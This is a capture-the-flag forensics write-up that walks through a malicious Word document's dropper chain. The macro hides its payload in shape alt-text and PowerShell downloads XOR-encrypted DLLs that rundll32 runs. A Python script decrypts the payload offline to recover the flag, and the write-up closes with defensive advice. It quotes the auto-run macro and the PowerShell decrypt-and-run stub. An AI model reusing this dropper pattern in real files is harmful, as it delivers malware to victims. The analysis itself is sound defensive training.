## Overview

MBCoin is a Medium **Forensics** challenge modelling a crypto-themed spear-phishing
attack. You get a malicious Word document and a packet capture of what happened when
a victim opened it. The task is to walk the dropper chain — macro → VBScript →
PowerShell → an XOR-encrypted DLL pulled over HTTP — and recover the flag, which the
final payload simply pops in a message box. Everything is done **statically**; the
malware is never detonated.

## The technique

Extract the macro with `olevba`:

```
Sub AutoOpen()
    WW = QQ1.AlternativeText + QQ2.AlternativeText   ' payload hidden in shape alt-text
    Open "C:\ProgramData\pin.vbs" For Output As #MyFile
    Print #MyFile, WW
    Shell "cmd /k cscript.exe C:\ProgramData\pin.vbs", 0
End Sub
```

The real stage-1 lives in the two shapes' **AlternativeText**, stored as UTF-16 — so
`olevba` shows it empty. Pull it with wide-char strings:

```bash
strings -e l mbcoin.doc | grep -iE 'DownloadFile|bxor|AlternativeText'
```

That reveals five PowerShell stubs, each downloading a C2 host to `wwwN.dll` and then
**XOR-decrypting** it with a per-host repeating key before `rundll32 www.dll,ldr`:

```powershell
$b = [IO.File]::ReadAllBytes("C:\programdata\www1.dll");
$k = ('6i'+'I'+'gl'+'o'+'Mk5'+ ... +'acA6');
for($i=0;$i -lt $b.length;$i++){ $r[$i] = $b[$i] -bxor $k[$i % $k.length] }
```

## Solution

Carve the served payloads out of the pcap, reconstruct the matching key from the
macro, XOR-decrypt to a DLL, and read its message-box string:

```python
import struct, re, subprocess

subprocess.run(["tshark","-r","mbcoin.pcapng","--export-objects","http,objs","-q"])

# key for the www4 host (cablingpoint.htb / vm.html), rebuilt from the macro's MM4 stub
KEY = ('6i'+'I'+'oN'+'o'+'Mk5'+'iRYAw'+'7Z'+'TWed0Cr'+'juZ9wijyQDj'+'Py'
       +'9Ms0D8K0Z2H5MX6wyOKqFxl'+'Om1'+'G'+'pjmYfaQX'+'acA6').encode()

b = open("objs/vm.html","rb").read()
dll = bytes(b[i]^KEY[i % len(KEY)] for i in range(len(b)))
assert dll[:2] == b"MZ"                        # valid PE32+
print(re.findall(r"HTB\{[^}]*\}", dll.decode("utf-16le","replace"))[0])
```

```console
$ python3 solve.py
HTB{...}
```

Two hosts served real 10 752-byte payloads. `priyacareers.htb`'s DLL is a **decoy**
that pops *"Are you sure this is the DLL that executed on the system?"*; the genuine
one from `cablingpoint.htb` has a `DllMain` that calls
`MessageBoxW(0, flag, "Congratulations!", 0)` — and that message text is the flag.

## Why it worked

Nothing in the chain is individually malicious: the macro only stages a script, the
script only downloads, and the payload is encrypted in transit. The flag only
materialises after you reassemble the pieces the way Windows would have — but you do
it in Python, offline, so the malware never runs.

## Fix / defense

- Block macro auto-execution (`AutoOpen`/`Document_Open`) from documents that arrive
  by email; open untrusted docs in Protected View.
- Egress-filter and alert on `rundll32`/`cscript` reaching out to freshly-registered
  domains; the multi-host fallback pattern is a strong indicator.
- For responders: `olevba`, wide-char `strings`, and `tshark --export-objects` recover
  the whole chain without ever executing the sample.
